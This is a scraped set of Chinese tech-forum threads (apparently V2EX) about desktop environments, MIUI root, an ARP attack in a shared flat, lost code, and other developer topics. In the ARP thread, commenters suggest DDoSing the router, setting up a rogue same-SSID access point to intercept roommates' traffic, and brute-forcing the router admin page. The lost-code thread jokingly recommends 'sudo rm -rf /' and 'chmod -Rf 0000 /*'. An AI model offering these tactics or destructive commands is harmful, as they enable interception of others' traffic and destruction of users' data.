桌面环境对比", "comment": ["有啥呵呵的，单单比较内存占用能说明问题？还有 13 年的文章也拿出来说事？", "不妨換算成內存條價格, 看看有多\"低效\"", "都什么年代了，还在乎这点内存占用？", "说的好\r", "我用 i3-wm", "相对于内存占用，我更在意的是源代码体积和最终安装包总大小！我也不是穷得没硬盘空间了，但总觉得，在功能完整的前替下，占硬盘空间越小，意味着越精炼高效。\r", "\r", "看看 Win10 的个头，明显就比不足一张 cd 大小的 xp 要臃肿得多，所以，性能不可能比 xp 更好，硬盘狂转，哪来的高效率。。。", "好用就行了，管内存干嘛？", " 最喜欢 xp 和 win7 ， win10 用了一年还是经常出问题，已换回 win7", " 不管什么系统，一块 SSD 是必须的", "没列 deepin de", "說真的 2G 內存跑 “臃腫”的 Gnome3 也沒覺得吃力，現在 8G 內存是起步吧。\r", "\r", "所以我個人倒覺得， 性能並不是關鍵， 穩定性才是大家最在意的吧，當然，美是大多數人都喜歡的。\r", "\r", "\r", "個人目前最喜歡的還是 Gnome3 和 XFCE4", " 现在觉得内存占用不能代表啥...我之前在公司的 x230 上跑 xubuntu (xfce) 一样慢，和 ubuntu 默认的 unity ? 一样慢。 换 lxde or fluxbox 才真正快了起来。", "为啥唯一标准里有三", "gnome3 要装扩展才好用,然后 gnome3 版本升级一次,所装的扩展不一定能继续用....折腾吧", "请问你对我 kde 教有什么意见么！（拳头准备", " 包太多，和 gnome3 一样，包也很多。。。", "That's not DE, most is WM.", "Raspbian 的 Pixel 桌面是我用的最舒服的", "Linux 莫谈桌面。。。。", "我有台工作机用 FreeBSD + XFCE", "都啥年代了，内存留着不用干吗，传给下一代啊？", "哪个好看用哪个，我选 KDE", "呵呵个啥。\r", "\r", "现在还拿 Gnome 2 说事？我怀疑 LZ 根本没用过 G3 ，只是人云亦云说不好用罢了。\r", "\r", "十年前还说 XP 好用，现在又如何？\r", "\r", "而且拿内存说事，还是 2013 年的文章，很好，很符合你说的“是否更好用了(Accessibility)，是否更高效了(Efficiency)，综合起来能否提升工作效率(Performance)”三个标准。\r", "\r", "=====\r", "\r", "另外我觉得 xfce 挺废物的，轻量级轻在了降低效率和减少常用功能上，就算是这样也没有明显比几个大桌面跑得更快 —— 实际上比较新的机器上你是用不出差别的，而老机器上 xfce 和那些大桌面一样卡，只有到 lxde 和更低的程度才体现出区别。", "自己写一个 wm ，爱怎样怎样，切。", "用 Window manager 和 Desktop environment 直接对比好像也不太合适吧，这俩不是一回事。", "没有 DDE ，楼主不行。", "不管图上是什么， 42 是最好的。", "但是 kde 帅啊", "我看不到 13 年，我看不到，我看不到啊！", " \r", "别人不喜欢，我们总不能强迫他们喜欢吧  ┑(￣▽ ￣)┍  ，守旧派们估计还能再战 10 年呐", "KDE 挺高效地的啊 要什么有什么 其他的工作生活高效的就属 xfce lxde 了。剩下都是渣。", "Kde 多么好！", "win7 出来的时候 大家都用 win XP ，现在大家都用 win7", "Gnome 3 好用？？？？ pfffft", "桌面难道不是只关心好看不好看吗？", "用桌面只是因为好看而已， 一般都不需要桌面环境， gnome3 要近 1GB ， xfce 才 300 多 MB ，包少的很，虚拟机里有 arch ，偶尔会需要浏览器，就装了个 xfce ，老电脑直接 ubuntu 上 unity ，能吃多少内存， 8G 内存已经是标配了。", "我就是受不了 linux 这种桌面争论，果断入手 MAC OS 。现在我都不需要为折腾桌面 而烦恼。你们自己争论吧。 MAC OS 大法好。", " 说白了你还不是在争论 macOS 和 Linux 桌面哪个好……根本没有脱离桌面争论嘛……", "内存是用来用 不是用来省的 \r", "这个都不明白还学啥计算机", "省下来给浏览器啊……", " \r", " \r", "\r", "我不明白什么时候有了这种思想，内存大我程序就可以随便开，可能是从带自动 GC 的语言成为主流之后逐渐形成的吧。我很喜欢那些小巧而又强大的工具，比如 vim ， awk ， sed 等等，我觉得这种软件才是 Linux 的精髓，专注，简单，小巧但又强大。现在已经很少看到新的这种工具产生了，反倒是 IDE 一个比一个大，游戏一个比一个大，需要的资源也越来越多，但是我觉得资源上面的开销远远没有给我带来对应的收益，反而是花里胡哨的东西越来越多了。我仍然认为一个优秀的软件应该像那些历经时间考验的工具一样，像 Linux 本身一样。\r", "\r", "一个很简单的例子，我买了个桌子，难道我非得把上面摆满东西么？", "我选 i3wm ，下一题", " 你还可以用打孔机 没人拦你 \r", "然而即然你选择了 GUI 而不是纯命令行界面 易用性带来的资源消耗 就像一个硬币的两面", " 看清楚我的回复内容再打字好么？谁说排斥 GUI 了啊？我自己用 MATE 啊，我强调的是 [资源上面的开销远远没有给我带来对应的收益，反而是花里胡哨的东西越来越多了] 看不懂么？\r", "\r", "你还可以用打孔机 没人拦你 \r", "---------------------------------------------\r", "把问题极端化，把思考方式简单化，然后推导出一个荒谬的结论，这种手段玩的也是溜。钩直饵咸，这种 Polarized thinking 在 GRE 的小作文里面是典型的 Logic Error 。\r", "\r", "按你的思路，内存是用来用的，不是用来省的。那你为啥还要把钱存在银行？为啥不花光呢？你这句话拿去问问任何一个做底层开发的，你看看他同意不同意。还好意思说这样思考才是学计算机的，估计也就你自己是这样学计算机的吧。\r", "\r", "还有动不动别人都不是学计算机的，按你的思路才是学计算机的，也是奇葩，各自有各自的观点，每个人有每个人的活法，你说的东西即使有道理，我还得自己分析分析是不是适合自己啊，诡辩起来倒是一套接一套的。呵呵", " 个人偏好不评论，最后那桌子举例子不是很恰当。不如说家里有很多柜子，但是你不喜欢把东西放满，只喜欢把东西集中在几个格子中，剩下那么多空间不用不是浪费了么？\r", "\r", "另外你给的列表里，最大也就用了 200M 内存，看上去和最小的差很多。但现在内存基本都是 10GB 级别往上走了，这点内存也就占用 2%不到。有什么好纠结的。\r", "\r", "内存和钱类比也是醉了，你内存留着不用能升值还是怎么的？", " Windows 8 开始就有一些蛋疼的服务在后台读写", "13 年的文章....", " 你的智商还不如你的机器的内存来的大", "歪个楼。类似的氛围让我感觉有点不适，比如因为一个“小问题”有些人就开始喷了，然后就是一波嘲讽。我好几次在 Quora 看到一些非常小白和简单的问题，然后下面几乎所有回答都是一本正经的在解答问题，要是同样的问题放在知乎的话，估计又是一波又一波的嘲讽。😂不知道这是不是我的偏见。。", "看内存没什么用的。\r", "\r", "就像辣鸡 Chrome ，占用内存在所有浏览器中遥遥领先，我还不是照样给一直用它。 还有 IDEA 全家。\r", "\r", "只要功能和速度给力，上 i7 7700k + GTX 1080TI + 16Gx4 我都没意见。", " 举报 @", " 人身攻击，请 Deactivate\r", "\r", "举报内容为本帖#46 楼，看了此人的历史回帖，不知道哪来的这么大的怨念，讲不出道理就直接人身攻击了，让他冷静冷静吧", "我不是针对谁，我只想说，在座的各个桌面环境", " \r", "#39 你知道用来写 KDE 、 GNOME 、 Chromium 的语言都不带 GC 么？\r", "Vim 确实小巧，随手编辑个文件够用了，但在 IDE 面前算不上强大。要正儿八经搞个工程的话，有折腾插件、魔改配置的时间还不如装个 IDE ，这才更符合你所谓的 Accessibility Efficiency Performance 标准。\r", "sed 、 awk 与专业运维工具同理。", " 问简单问题是一回事，用奇怪的例子下奇怪的结论再嘲讽一波又是另一回事。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>刚刷了 MIUI 开发版本 也就穿了点资料,想搞谷歌全家桶 在知乎上看到刷 <a href=\"http://mi.eu\" rel=\"nofollow\">mi.eu</a> 英国版本的 ....</p>\n<p><a href=\"http://HK.mi.com\" rel=\"nofollow\">HK.mi.com</a> 和知乎上有教程,动手能力我是没关系,只不过要折腾搞一下子. ..</p>\n<p>平时 SSR 之类需要 ROOT? 作为一个写代码的说 不是很常用 但是 ROOT 必须得有呢...</p>\n<p>抱拳~</p>\n</div></div>"], "reply": "52", "tittle": "MIUI 你们有没有用国际版 root 没有?", "comment": ["正在用国际版，没有 root 。 shadowsocks 不需要 root ， ssr 不清楚。", "国内版带着小米全家桶，国际版带着 Google 全家桶...然后我就刷了个 LineageOS", "miui 国际版可以设置中文的吗", "LineageOS 现在全是 nightly 版本呀，为啥不刷魔趣？", " 可以", "感觉是否解锁 BL 的意义大于 root", " 说 LineageOS 现在全是 nightly 版本呀，为啥不刷魔趣？\r", "\r", "魔趣好歹也是在 lineageOS 源码上修改。。 lineageOS 有 bug 的地方估计魔趣也会有", "eu 好像没有  可以刷 supre su", "miui 官方国际版，已 root 。\r", "ssr 不需要 root 。", "ssr 不需要 root 啊", "没 root ，没必要也不安全。记得重新锁上 bl 。", "据说俄罗斯第三方的 ROM 好", "我在海外国际版特别不错", "我不用官方 rom ，总是卡", "LineageOS+opengapps 大法好。", "SSR  不需要 root", "国内版可以直接可以免 root 装谷歌，系统语言改成英文可省一些广告以及可以获取部分国内应用的外国人待遇。 SSR 不用 root.", "国内开发版可以装谷歌全家桶，很方便，不需要 root", "用的国际版，没有 root 。我手机上软件不多且几乎没国产， root 对我的好处有限。", "rr 大法好", "miui 每次添加 root 程序都要问四遍，每次间隔 5 秒，关键开启了之后有时候程序那边还是检测没有 root 权限， miui 真是越来越糟心了。", " \r", "  在那里装...", "听说波兰版挺好用 不过我没试过", "尝试了国内开发板和国际版，最后换回了稳定版+刷 root ，可以满足需求。", " 下个 Go 谷歌安装器", " 我之前的手机就是用这个 提示要 root 权限", "在用国际版的 miui 无 root 需求只安装 play 的 app", "miui 国际版的 play 商店的正在等待 wlan ” 问题无解", " 不要用自带的 root  可以刷第三方 rec 再卡刷 supersu ！", "你用的是哪款手机？我用的小米 5s 谷歌搜的“小米 5 谷歌安装”就一个 apk 然后小米 5s 也能用", " 有解… 打开下载管理，右上角选择全部开始即可。", " 有一种刷机方式，叫 MDL", " 国内的 ROM 不敢刷。", "我以为 root 了能抽 ssr 呢！！！", " 主力机懒得折腾，怕和开发版更新冲突", "这种 mi.eu 或者类似地方根本就不是国际版的 MIUI,第三方作品而已 \r", "官方国际版请根据机型去 en.miui.com/gid-23.html\r", "\r", "国际版+magisk 不错,不影响 ota\r", "Google 全家桶不用 root 就能冻结,小米全家桶嘛。。。。。。。。。。。。。。。。。。。", "国际版还是值得的.", "为何不直接 apkpure ?", "用国内稳定版 root ,然后解包国际版提取 google 扔进去。", " #31 Play 里几个要安装的应用都在等待连接 WLAN ，然而下载管理里什么都没有……", " 是没有… 但是点全部开始就可以下了。无意间试出来的，现在应该有效的吧。", "我用国内开发版 不用 root 也可以用 ss 也可以装谷歌全家桶 play 市场可以自动后台安装软件不需要确认安装", " #41 下次试试，现在每次都是把 Google Play 商店卸载更新，然后老版本可以正常安装…", "root 了，需要刷一个第三方的 recovery ，然后去刷 supersu 就可以了。", "我的小米 5s 刷了国际版之后，自带 Google 全家桶，实际上不用 root 也可以。 root 只是给绿色守护用的。", "波兰版的\r", "肯定得 root 呀", "手动 fastboot root 即可 得解锁 bootloader 没解锁的得用黑科技解", " 5s 同 我试试\r", "真的可以用..", "吐槽一下。 xiaomi.eu 竟然 ban 了国内 ip", " OK 。 我之前是在 XDA forum 小米 5s 专区看到的。 现在装太方便了。 😊", "我用 twrp 刷的国际版.....刷完就自己要求安装 superSU 了呀", "国际版没 root ，挺好用的"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://bbs.lbsyun.baidu.com/forum.php?mod=viewthread&amp;tid=127479&amp;page=1&amp;extra=#pid274957\" rel=\"nofollow\">http://bbs.lbsyun.baidu.com/forum.php?mod=viewthread&amp;tid=127479&amp;page=1&amp;extra=#pid274957</a></div>"], "reply": "10", "tittle": "百度终于干了次人事儿->百度地图开放平台全面支持国测局坐标", "comment": ["终于不再坚持他自己的那一套坐标系了。", "啥时候能把火星坐标也放弃了， WGS 一统天下", " 可能性不大，这玩意是国家为了安全强制加的。虽然这玩意本身是个笑话。", " @", " 官方的天地图用的是 cgcs2000 坐标, 基本上就是 wgs 坐标", " 奏是，有个屁用，除了制造麻烦。然后国内特别热衷另搞一套。", "百毒终于干了件 人事。。。", "火星坐标也是搞笑，都被人搞烂了还不放弃，真的逗", "百度地图 api 支持国外吗？", "相信我如果他在这里把坑给你填上了，前面肯定还有其他的坑！流氓不干流氓事还叫流氓吗？", "国内的火星坐标官方说法是为了安全，不然米国他们轻轻松松就能把导弹打过来直接命中靶心。。。\r", "\r", "然鹅现实情况是：\r", "在国内的所有地图服务商，都只能用这个火星坐标，而且正常坐标转换到火星坐标还要得到 “有关部门”批准，说白了就是出钱买加密方法。。。。。一般的公司都木有自己的卫星定位系统啊，只能买服务。\r", "\r", "平时我自行车导航设计线路都是 Google 地图，出来的坐标或者线路根本没法用于国内的这些地图上。。偏移很不爽。\r", "但是国内这些东西做得太烂，不是没有功能，就是功能一大堆不相干的。\r", "\r", "Runtastic 系列的程序全都是这个问题，用过的朋友都应该知道。\r", "\r", "\r", " 对于这自己一套搞得乌烟瘴气，随随便便都能拿出好几十个例子来，当年的 wifi 模块、 FM 调频到前几年的 TD-SCDMA......"]},
{"content": ["<div class=\"topic_content\">对这个不是太懂，谁能解释下什么是 arp 入侵攻击，怎么追踪到攻击的地址，我的密码是否还安全？贴上链接也可以，谢谢了。</div>"], "reply": "32", "tittle": "今天在租的房子里遇到 arp 入侵攻击，该如何防范？", "comment": ["能控制路由么？能的话再路由端绑定 mac 一劳永逸\r", "不能控制路由就上 ARP 防火墙\r", "arp 欺骗原理 以及 什么事 arp 表？这个随便开个搜索引擎都能查吧", "这算标题党了吧，不懂你怎么知道遇到 arp 入侵攻击？", " 360 提示的（手动滑稽）。", "拔网线(逃", "标题党。。。", "就是被 p2p 限速了吧", " 当年在网络课的实验课上...各种 360 提示.", "随便挂个代理就解决了", "之前我是连接我自己的路由器，然后路由器在连接房东的路由器，网页打不开， 可以下载。\r", "所以我就关了路由器，电脑直接连接房东的路由器，然后提示 ARP 网关欺骗。\r", "然后 360 追踪不到攻击者 IP 。\r", "根据一楼的提示搜索了关键字，最后在局域网内扫描了下发现 IP ： 192.168.2.116 （ mac 地址也有，这里不发了）有一台电脑的网卡是混杂模式，今天打算问下房东路由器的密码，不知道能不能把人揪出来。\r", "大家是否支持我上门真人 PK （手动滑稽）？", "IP 和 MARK 绑定", " IP 和 mac 绑定", " 真人 pk 去吧。去之前打个 120 ，为你俩", "攻击者 ip 地址很容易，，\r", "关键你没有路由器管理权限。。租的房子 就这样。。   有路由器管理你直接 劫持网站都 ok ，，\r", "\r", "其实 他 arp ，，你可以更狠，，直接 ddos ，，机器性能不太差，，两三秒就让路由器蹦，", "arp 攻击不只是 p2p 限速这么简单，还可以进一步发起 mitm 中间人攻击。", "arp 攻击，本机和路由器都要防，路由器不支持 mac 绑定，而人家又攻击路由器，就真没办法", "楼上的居然怀疑 360 提示的警告，说楼主标题党？？？", " 顺着信号砍过去吧", "物理反击嘛。你都知道在同一个房间了。\r", "在公司的时候做网管，每个人的 IP 都是绑定的，上班下迅雷打游戏统统批判一番。", "宽带独享就没有这种问题了", "直接写死路由器的 MAC", "目前房东的路由器链接了 6 个房间，打算今晚等人都回来了，通过短时间拔掉网线看攻击者是否还连接在路由器上，从而判断是哪根网线，在从网线判断房间。\r", "\r", "有没有更好的方法？", "估计是有人用了限速软件", " 要到路由器密码，把那个 IP 封掉，然后在路由器旁边蹲点，看看有没有人出来看路由器，不用说了就是你了~", "ip 和 mac 静态绑定了就没事了。", " 妙啊，我不会告诉你路由器在我房门对面（猫眼可看见） ←_←", "买个和房东一样的路由器， wds 或者刷个 openwrt 桥接房东路由器，密码和 SSID 都设置成和房东的一样。\r", "当大家都在时，把房东路由器关了，所有用户断开连接，查看无线网时发现没有连上 wifi ，之后连上你的 wifi 。\r", "发现没网，出来发现路由器没开，打开路由器，发现可以愉快上网了。\r", "此时，所有的用户都连接上了你的路由器。\r", "嘿嘿嘿，你懂的。", "ARP 攻击不要弄任何花架子，除了在路由器绑定所有 IP 这一简单到极点的方法，没有其他任何可靠的办法", "我记得根据 mac 地址能查出设备类型，这样能过滤一部分室友", "把其他人网线都拔了🙃", " 没有主路由后台权限的话， WAN 链接外网的账户密码也看不到吧，怎么做到买个一模一样的路由然后设置同样的 SSID 和密码进行静默替换呢？\r", " 另外，主路由链接了 6 个房间，不算情侣合租的话，一个房间一个人，设备按保守的 3 个算（手机、电脑、 ipad ），就是 18 个设备，高峰时段只要其中一个设备看视频就是卡成狗的状态了，而且现在大家都这么爱看视频\r", "所以最后结论：楼主尽快搬家，远离这种群租房", " 其实不需要同样的路由器，也不需要替换， wds 就相当于扩展了房东的网络，再者你有路由器可以设置成同同一个 ssid 同一个信道，自己 4G 限速提供路由器有网，关闭房东路由器。等你路由器连接上相当数量的客户端时，你再重启房东路由器， wds 之后也同样可以实现替换。\r", "\r", "主要思路就是让其它人连接上你可以管理的路由器，方法很多，只要大家敢想\r", "如果房东路由器是比较老的，没有限制登录次数，可以暴力破解后台，这个更暴力更简单。\r", "\r", "人生如戏，全靠演技，只要你敢想敢演，群租房也很快乐。", " 6666"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>之前发过一个帖子咨询大家的处理经验. 之后搜索网上一些资料,最终通过参照 smartim 写了个插件,初步解决该问题.</p>\n<p>安装后在编辑器中输入\":set switch-to-english-when-exit-insert-mode\",这个把这个命令加入到~/.ideavimrc 中,即可启用该功能.</p>\n<p>目前只能支持 macOS 因为不会写 LInux/Windows 的 Native 代码,希望有兴趣的朋友可以帮忙补充.</p>\n<p>有需要的朋友可以下载安装,多提意见.</p>\n<p>已经整理发布到了<a href=\"https://github.com/hadix-lin/ideavim_extension\" rel=\"nofollow\">GitHub</a>请有需要的朋友下载.</p>\n<p>也已经提交到 jetbrain 的插件中心,过几天审核通过或许就可以直接在 IDEA 中搜索到该插件进行安装了.</p>\n<p>预编译的版本,可以通过百度网盘下载<a href=\"https://pan.baidu.com/s/1dFuxOL7\" rel=\"nofollow\">ideavim_extension</a></p>\n</div></div>", "<div class=\"topic_content\">补充说明,插件的原理是利用系统 API 来切换输入法,为默认的美式英文键盘.\r<br>所以系统必须在输入源(Input Source)开启这个键盘.</div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>增加了回到插入模式恢复之前的输入法的能力</p>\n<p><a href=\"https://github.com/hadix-lin/ideavim_extension\" rel=\"nofollow\">https://github.com/hadix-lin/ideavim_extension</a></p>\n</div></div>"], "reply": "8", "tittle": "IdeaVim 扩展插件:退出插入模式时自动切换为英文状态", "comment": ["顶一个 问个问题 native 的 extension 是怎么写的 \r", "libinput-source-switcher.dylib 里面是啥", "有输入法要求吗？我用的百度五笔插件好像没有作用。。", " 跟你用什么中文输入法无关的,但是必须在输入法里面开启默认的英文键盘.", " 我是用 smartim( ", ".", "为什么不是直接使用 smartim ？我一直就用这货。", " 那是用在 vim 中,现在这个是用在 Intellij IDEA 中配合 IdeaVim 使用的.", " 我也在命令行的 vim 中尝试使用 smartim 但一直没生效,测试过它的命令行工具是 OK 的.", "这个正需要。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>平时用 VSCode ，想换一个编辑器玩玩。。</p>\n</div></div>"], "reply": "5", "tittle": "spacemacs 用来写前端怎么样？", "comment": ["另外， 这个项目有 1000+ issues, 300+ pull requests..... ", "一直在用 specemacs 写前端， react 完美支持。 vue 的模版支持还好，但是在 vue 文件里面写插入 js 代码不好用， 没有补全之类的，但是无伤大雅", "不错的。就是更新要慎重。", "一直用这个写代码。\r", "golang ， python ， php ， js ， react （ react 文件我全部命名 jsx ，会支持的更好）， dockerfile ， shell\r", "没毛病", "不错的 写前端很合适"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://www.cnblogs.com/sunsky303/p/6506663.html\" rel=\"nofollow\">http://www.cnblogs.com/sunsky303/p/6506663.html</a>\r<br>\r<br>吐槽点\r<br>1. 计算量太小，快的才几十毫秒，容易受操作系统影响放大误差\r<br>\r<br>2. Cpp 版没有输出，加优化后计算过程很可能都被干掉了\r<br>\r<br>3. 脚本和 Java 的解释器有 bootstrap 时间，这个一次性消耗的时间也计入测试里面去了\r<br>\r<br>4. Java 没有先做预热，把 jit 优化时间也计算进去了\r<br>\r<br>还被 jobbole 转载了，不知道要坑多少人</div>"], "reply": "6", "tittle": "吐槽不靠谱的性能横向测试", "comment": ["人家都说了是“突发奇想”做的 😂", "没办法", "不是经常出现语言圣战吗？\r", "没人组织下来个比赛吗？\r", "给出几个简单需求，各个语言支持者自己实现下，比较下哪个语言性能牛、代码结构合理、易于理解？？", "但这种东西吸引流量和眼球啊，你看这帖子不就是效果的体现了吗", "说实话吧，测试方法问题不大，主要是测试的目的不明。\r", "\r", "这个测试说明 Java 可能不是最适合某些特殊的场合。\r", "\r", "比如开机时启动执行一次的设置程序。", " 看清楚了，是性能测试，启动时运行一次的设置程序，根本不需要性能。如果那里性能很重要，可以得出 Java 比 Python/Shell/perl 更适合写启动时设置的程序这种结论。\r", "\r", "测试方法问题不大？ C++程序那段计算的代码，都被编译器优化掉了，压根儿就没调用，这都可以？"]},
{"content": ["<div class=\"topic_content\">写了一天的代码没 git add ，创建一个新的分支后用 rm -rf *清掉了从 master 继承过来的全部代码，准备写入新的代码。当切回 master 时，发现整个世界都静止了（手动微笑\r<br>\r<br>用了两个多小时把这一天写的代码又都回想起来并调试成功，终于长舒了一口气。\r<br>\r<br>你说我手贱不贱？\r<br>\r<br>贱。</div>"], "reply": "95", "tittle": "临下班前不小心把一天写的代码都删了", "comment": ["这时候 intellij 的 local history 就很有用了。", "这时候体现了代码放网盘同步文件夹的重要性", "好气啊！！！", "已感谢,浪费了你的 2 小时,拯救了 2 小时*n....", "既视感强烈", "我能怎么办我也很绝望啊", "回家睡一觉，假装今天不存在，明天重新开始", "充分证明 deadline 是第一生产力", "今天差点就这么干了。", "说明流程还可以改善一下。", "我今天也干了这么一把, 还好找回一个调试时留下的编译文件，还原出代码以后就下班了，心累。。。", "说明你今天工作量非常不饱满，其实 2h 就搞定了。。。", "真巧，我今天也把前几天的代码删了，是因为 merge 错 branch 了，结果 revert 的时候选了 hard ，把没 commit 的也一起 revert 了...", "mac 上有 timemachine 每小时备份\r", "linux 上有 btrfs + snapper 每小时一个 snapshot\r", "\r", "出问题顶多丢一个小时的东西……\r", "\r", "当然，除非 btrfs （又）炸了……", "干过同样傻事+1", "干过同样的傻事 +1", " 这是 CentOS 的独有功能吗,Ubuntu 非 btrfs....有替代方案吗...", "我也干过类似的事情，用 intellij 的 local history 找回来了", "这个没做过，不过就是写论文的时候忘记了保存而已", " 不是 centos 专有的，是一个 linux 分区格式，类似 ext4 一样，出现的目的就是为了弥补当前一些文件系统的缺陷", "不能明天上班再写一次吗 = =！", " 不是 CentOS ，我用的 archlinux ……只要文件系统是 btrfs 就行， snapper 自己可以装\r", "\r", "替代方案没考虑过……新挂个分区 /镜像格式化成 btrfs/zfs 这类支持 snapshot 的文件系统就好……", "心疼一波前辈😂", "所以用 git rm 命令，不要用 rm -rf\r", "或者用 git clean 命令，\r", "git 库管理尽量使用 git 命令，可以在 reflog 里回退", " #17 btrfs 有提供工具（ btrfs-convert ）将 ext{3, 4}转换成 btrfs 。但 snapper 在 arch 上一直报权限错误，最后用的这个 ", " 我之前也用这个，后来觉得还是 snapper 灵活一点，供参考\r", "权限错误怎么说……没碰到", "我已经干过两次了-_-", "我也干过一次，充分说明设计才是最费时间的。码代码真的跟搬砖一样是体力活。", " #26 直接命令行创建 snapshot 是没问题的，但是 cron 创建的时候就报 No Permission 。要说是 cron 的问题好像也不是， snapper 和 btrfs-snap 的任务都是放在 cron.{hourly,day...}下的。后面直接用了 btrfs-snap ，不管了。", "有一个周六的晚上!我写了一个晚上的文章 要发博客的!因为电脑开的程序比较多...在四点的时候电脑死机了!只有重启电脑才能好!你们都知道 simplemde 吧!博客的富文本编辑器就会他!没有自动保存的功能那种!我当时的内心你们可能感受不到!写到半夜四点啊 没了!后来我学聪明了  在简书写 !写了在复制到我博客上 ....", "我想起一个笑话：一个小蝌蚪拼命地游啊游，打败了所有的对手，到达终点时发现只是一张纸巾", "这种错误我应该不会再犯 理论上", "昨天干了类似的事情，原来打算删调试机上代码的，结果把开发机上的代码删掉了。\r", "\r", "幸亏我机制将代码放到 Dropbox 可以触及的地方。\r", "\r", "话说现在 Dropbox 改版了，误删的文件恢复起来更便捷了", "刚工作的时候曾经把我和一个同事 2 ， 3 天的代码给删了，囧。", "曾经花 2h 魔改一个程序，费好大劲把编译错误都修完，一运行，然后这货就把自己目录连同自己都删了...", "线上线下两台服务器配置一模一样，线上是绝对不用 rm -rf./*的，昨天早上上班，手滑点错 shell 界面了，连到线上去了。\r", "而且手滑，/不知道为啥没输入，你猜怎么样吧。\r", "快照回退到一星期前，线下版本部署上去。差点吓晕过去。。。。", "……从来不需要 rm *，不过试过用 git clean 时犯类似的错（", "sudo rm -rf / 是一个更强大的命令, 楼主可以试试.", "花两个小时回忆起代码 不等于 创作代码只需要两小时，这应该不难理解吧，就像你写一篇文章要一个小时，复述这篇文章可能只要 5 分钟", "干过同样的傻事 +1", "(手动滑稽", "干过...... 不过多亏了 idea", "微软也用 linux ？", "没遇到过这种破事。自以为没信心手工跑 Git ，所以都让工具帮我做，省心。", "请养成下列习惯：\r", "勤开分支\r", "写完一个小模块或小改动就马上提交\r", "勤推送提交和分支\r", "\r", "push 禁止加--force\r", "reset 禁止加--hard\r", "commit 禁止加-a\r", "\r", "\r", "\r", "话说实际上 git 的每一个提交都应该是明确的“一件事”，写一天的代码如果能拆成几件事的话就最好及时分几次提交，而不是等一天甚至几天写完再提交，任何工作都应该新开一个分支进行开发和提交，因为保不齐会尝试多种方案以及对原分支的紧急修改上线。", "一直在 Dropbox 里写代码\r", "为什么都这么喜欢 rm -rf ，用回收站多好 ……", "看成了临下班前一天把代码全删了\r", "还以为离职前一天删代码跑路", "rm 可以找回来的，很容易。\r", "\r", "但是有一次我误把代码覆盖了，真找不回来了。\r", "\r", "用的 Perforce ，不是 Git", "试试这个命令 git fsck --lost-found ，没 add 的不知道能不能找回", "~/.vim/backup 救了我若干次", "intellij 的 local history +1", "祸兮福所倚, 说不定再写一遍代码质量会更高呢", "local history +1", "有 local history ，即使删除掉关机重启都不怕。", "这事儿我也干过，当时文件系统是 ext3 ，想用 extundelete 恢复必须得 unmount 硬盘，公司不让 unmount （老爷机，上次重启硬盘就挂了），最后跟楼主一样，花了两个小时又重新写了一遍...", "这时候安利一下我的项目：\r", "\r", "\r", "\r", "因为 GitLab 误删事故而造出来的东西。", "竟然不是写一段代码提交一段代码。也是醉了。", "不是手贱的问题啊，是习惯问题。谁也不能保证自己在关键时候不出错，所以只能过一段时间提交一次，把损失降到最低。", "中午吃饭前不提交一次？", "程序员的日常", " 微妙，反正能用就行，不管了……", " 已经 commit 过不用怕， git reflog", "Local History 分分钟找回。", "commit 啊", "以前干过类似这种的蠢事，还好 IdeaJ 有 Local history. 现在用 vscode 的时候果断也装了个 local history 的插件", "rm -rf *是什么鬼，为什么会有这个操作", "曾经为了这事儿，我加了一整个周末的班。。", "git 好像有回退执行过的指令的功能的", "没关系，写过的代码重写一遍会更整洁。", "我也被 intellij 的 local history 拯救过", "习惯不好。\r", "我用最简单的 VIM+git ，几年了也没出这样的事。\r", "不过前几天我把自己的数据库数据改错了，气得我几天没干活，一直在反思。", " 2333", "没事一定要 add commit push 一下啊", "曾经把写了一个月的代码 del 掉了， 花了一个星期 恢复出来， 23333333", "local history 再次立功！", "Local History  分分钟找回啊", "所以要随时 commit 呀。嫌历史不好看，提交前 rebase -i 整理成一个就好了嘛。", "我前几天也做了这个事儿  切回分支然后懵逼", "神器啊~ local history 再次立功了", "idea local history", "zfs 或者 btrfs + 自动 snapshot 。\r", "我是 5 分钟一次，所以丢也只会丢 5 分钟内的。", "local history +10086 次拯救", "我上一个单位，还有管理员辞职前在 SVN 上删了一个月的代码呢……", "local history 真的有用\r", "一天都不 add 和 commit 一下?", "哈哈，也干过这种事情，后来就再也没犯过了", "之前上过一次写了一周的，做的一个挺大的需求，写了一个月．　因为总是喜欢在干净的分支上开发代码，总是把项目 rm -rf 删掉之后再重新 sync 下来开发，有次来了个新的紧急 bug ，就脑袋一热把写了一星期的代码删掉了．．．．\r", "后来总结是流程有问题，改成每天下班把代码提交到服务器（不合入），之后追加上去", " 回收站写代码笑尿。。", " 也可能是直肠和食道", " 感受过，抓狂；\r", "曾经在一个网站写回答，写了很久的长篇，然后点提交，它告诉我提交失败，回退后发现什么都没有了，要死要死的感觉。", "试过在手提上写了一堆代码，现场没有调试工具，盖上后拿回家\r", "tm 打开后解锁卡在登陆界面。。。", "刚好重构一次", " reset 加 --hard 也可以通过 reflog 找回来（除非你有 没提交的更改，不过这样的话用 reset 本来就很危险）", " 就是习惯而已，不推荐用，不是不能用。", " 你听说过 chmod -Rf 0000 /*吗", " \r", "承让, 我只把 / 用 compress 处理过, 大家殊途同归"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前用 phantomjs 抓取一个网站，这个网站完全用 reactjs 写的， phantomjs 完全不支持这么高版本的 js ，直接抛出错误，所以有没有什么好一点的 headless 浏览器能支持 reactjs ，或者说内核是最新版本的 chromium 内核？</p>\n</div></div>"], "reply": "7", "tittle": "有没有什么 headless 浏览器支持 reactjs？", "comment": ["没有，但你可以直接用 chrome ...", "试试 CFE3 ？", "手误 CEF3", "phantom 至少 es5 是完全支持 promise 貌似不支持 需要 polyfill 一下 自己先注入一个 polyfill 再跑", "需要注入一个 function bind", " 能详细点吗，谢谢"]},
